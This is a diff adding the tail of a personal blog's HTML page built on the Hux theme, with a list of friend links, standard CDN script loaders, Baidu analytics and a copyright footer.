+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
